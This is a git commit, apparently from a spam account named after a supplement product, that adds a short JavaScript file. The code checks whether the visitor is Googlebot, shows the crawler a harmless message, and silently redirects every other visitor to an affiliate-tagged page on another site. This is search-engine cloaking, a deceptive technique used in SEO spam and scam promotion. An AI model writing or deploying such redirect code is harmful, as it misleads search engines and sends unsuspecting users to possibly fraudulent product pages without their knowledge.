2471f3cddd5cb1cfeac9999440e969bdbf429cdb
vitalboostxlgummies <infoimprintcom+vitalboostxlgummies@gmail.com>
2026-04-29 16:52:50 +0500

    Add files via upload

---
+++ vitalboostxlgummies.js
@@ -0,0 +1,6 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "https://primeperformpro.com/welcome/#aff=rssk78";
+} else {
+  console.log("Thanks for visiting my page");
+}
